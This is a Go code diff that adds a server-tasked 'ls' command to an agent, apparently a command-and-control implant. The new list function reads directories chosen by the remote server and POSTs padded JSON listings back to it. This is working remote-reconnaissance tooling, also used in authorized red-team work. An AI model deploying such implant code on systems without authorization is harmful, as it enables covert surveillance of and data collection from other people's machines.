@@ -714,6 +714,48 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 				}
 			}
 
+		case "NativeCmd":
+			var p messages.NativeCmd
+			json.Unmarshal(payload, &p)
+
+			switch p.Command {
+			case "ls":
+				listing, err := a.list(p.Args)
+				var se string
+				if err != nil {
+					se = err.Error()
+				}
+
+				c := messages.CmdResults{
+					Job:    p.Job,
+					Stdout: listing,
+					Stderr: se,
+				}
+
+				k, err := json.Marshal(c)
+				if err != nil {
+					panic(err)
+				}
+
+				g := messages.Base{
+					Version: 1.0,
+					ID:      j.ID,
+					Type:    "CmdResults",
+					Payload: (*json.RawMessage)(&k),
+					Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
+				}
+				b2 := new(bytes.Buffer)
+				json.NewEncoder(b2).Encode(g)
+				if a.Verbose {
+					message("note", fmt.Sprintf("Sending response to server: %s", listing))
+				}
+				resp2, _ := client.Post(host, "application/json; charset=utf-8", b2)
+				if resp2.StatusCode != 200 {
+					if a.Verbose {
+						message("warn", fmt.Sprintf("Message error from server. HTTP Status code: %d", resp2.StatusCode))
+					}
+				}
+			}
 		default:
 			if a.Verbose {
 				message("warn", fmt.Sprintf("Received unrecognized message type: %s", j.Type))
@@ -921,6 +963,31 @@ func (a *Agent) agentInfo(host string, client *http.Client) {
 		return
 	}
 	a.FailedCheckin = 0
+}
+
+func (a *Agent) list(path string) (string, error) {
+	if a.Debug {
+		message("debug", fmt.Sprintf("Received input parameter for list command function: %s", path))
+
+	} else if a.Verbose {
+		message("success", fmt.Sprintf("listing directory contents for: %s", path))
+	}
+	files, err := ioutil.ReadDir(path)
+
+	if err != nil {
+		return "", err
+	}
+
+	details := ""
+
+	for _, f := range files {
+		perms := f.Mode().String()
+		size := strconv.FormatInt(f.Size(), 10)
+		modTime := f.ModTime().String()[0:19]
+		name := f.Name()
+		details = details + perms + "\t" + modTime + "\t" + size + "\t" + name + "\n"
+	}
+	return details, nil
 }
 
 // TODO Make a generic function to send a JSON message; Keep basic so protocols can be switched (i.e. DNS)
